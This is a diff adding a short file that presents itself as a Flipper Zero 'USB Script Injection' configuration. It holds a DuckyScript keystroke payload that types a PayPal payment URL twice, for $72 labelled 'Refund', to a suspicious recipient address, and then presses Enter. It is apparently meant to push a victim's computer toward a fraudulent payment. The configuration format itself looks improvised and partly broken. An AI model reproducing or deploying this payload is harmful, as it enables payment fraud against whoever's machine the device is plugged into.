@@ -1,0 +1,16 @@
+# USB Script Injection Configuration File for Flipper Zero
+
+[DuckyScript]
+EnableScriptInjection = true
+Script = "
+DELAY 1000
+STRING https://www.paypal.com/cgi-bin/webscr?business=PayPal.me@Amazon10100&cmd=_xclick&currency_code=USD&amount=72&item_name=Refund
+DELAY 500
+STRING https://www.paypal.com/cgi-bin/webscr?business=PayPal.me@Amazon10100&cmd=_xclick&currency_code=USD&amount=72&item_name=Refund
+ENTER
+"
+LogFile = usb_ducky_scripts_log.txt
+
+[Logging]
+EnableLogging = true
+LogLevel = Info
